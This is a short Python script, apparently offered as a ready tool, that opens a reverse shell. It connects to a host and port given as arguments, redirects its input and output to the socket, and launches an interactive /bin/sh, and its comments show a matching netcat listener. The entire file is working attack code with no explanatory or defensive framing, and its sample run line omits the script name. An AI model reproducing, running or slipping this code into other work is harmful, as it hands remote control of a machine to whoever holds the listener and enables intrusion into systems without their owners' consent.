# coding=utf-8

# run:
# nc -l 8888
# python 127.0.0.1 8888

import socket, subprocess, os, sys

if len(sys.argv) < 3:
    print("Usage: python xxx.py ip port")
    exit(0)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(["/bin/sh", "-i"])
